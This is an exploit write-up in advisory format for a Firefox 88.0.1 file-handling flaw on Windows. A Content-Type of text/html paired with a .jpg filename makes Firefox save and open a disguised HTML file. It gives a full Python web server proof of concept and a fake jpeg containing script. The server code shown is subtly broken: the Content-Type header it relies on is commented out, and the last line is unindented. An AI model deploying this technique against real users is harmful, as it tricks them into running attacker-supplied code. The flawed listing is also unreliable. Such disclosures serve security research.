# Exploit Title: Mozilla Firefox 88.0.1 - File Extension Execution of Arbitrary Code
# Date: 20/05/2021
# Exploit Authors: Carlo Di Dato and Michael Caruso from BestEffort Team (https://besteffortteam.it)
# Vendor Homepage: https://www.mozilla.org
# Version: <= 88.0.1
# Tested on: Windows XP Professional SP3 32-bit, Windows 7 Professional SP1 64-bit, Windows 10 20H2 (build SO 19042.805)
# Blog: https://besteffortteam.it/mozilla-firefox-content-type-confusion-unsafe-code-execution/

A vulnerability has been identified in the way Mozilla Firefox handles downloaded files on Windows.
Unlike the other most used browsers (Google Chrome, Internet Explorer, Edge), the action Mozilla Firefox takes is based on the "Content-Type" attribute.
Let's consider a scenario in which a server responds to the client in this way:

Content-Type: audio/mpeg
Content-Disposition: attachment; filename="test.jpg"

What one would expect, is that Mozilla Firefox will handle the file as an image (.jpg) but it is not and the "open-with" window will ask the user to open a mp3 file.
By itself, this is not a problem (although we do not agree with the choice), however we have found that in a particular circumstance, it is possible to "confuse" Firefox using a combination of "Content-Type" attribute and file extension which leads to the arbitrary execution of code. Specifically, if a server responds with a "Content-Type: text/html" and a filename that has the extension ".jpg", Mozilla Firefox will show the end user an "open-with" mask, asking to open the jpg file with the default program (usually a browser), but will download the above mentioned file into the system's temporary folder using the extension ".html". Subsequently, the downloaded file will be opened using the default program for .html files (browsers). It is easy to understand that it is possible to create a fake image, containing JavaScript code, which will lead to the execution of the code itself.

As proof of concept, we used the following ready-made python web-server
(server.py):

try:
    import http.server as BaseHTTPServer # Python 3.x
except ImportError:
    import BaseHTTPServer # Python 2.x
import os
import shutil
import sys

FILEPATH = sys.argv[1] if sys.argv[1:] else __file__

class SimpleHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        with open(FILEPATH, 'rb') as f:
            self.send_response(200)
            #self.send_header("Content-Type", 'text/html')
            self.send_header("Content-Disposition", 'attachment;filename="{}"'.format(os.path.basename(FILEPATH)))
            fs = os.fstat(f.fileno())
            self.send_header("Content-Length", str(fs.st_size))
            self.end_headers()
            shutil.copyfileobj(f, self.wfile)

def test(HandlerClass=SimpleHTTPRequestHandler,
    ServerClass=BaseHTTPServer.HTTPServer,
    protocol="HTTP/1.0"):
    if sys.argv[2:]:
        port = int(sys.argv[2])
    else:
        port = 8000
    server_address = ('', port)

    HandlerClass.protocol_version = protocol
    httpd = BaseHTTPServer.HTTPServer(server_address, HandlerClass)

    sa = httpd.socket.getsockname()
    print("Serving HTTP on {0[0]} port {0[1]} ... {1}".format(sa, FILEPATH))
    httpd.serve_forever()

if __name__ == '__main__':
test()

a fake jpeg (test.jpg) containing the following code:

<script>
alert("D'oh! This is not a jpeg file!!!");
</script>

Then we ran the python script in this way: python server.py test.jpg

Once a user browse the malicious server, Mozilla Firefox will ask for opening the file and, if the user click confirms the operation, the file will be downloaded and executed.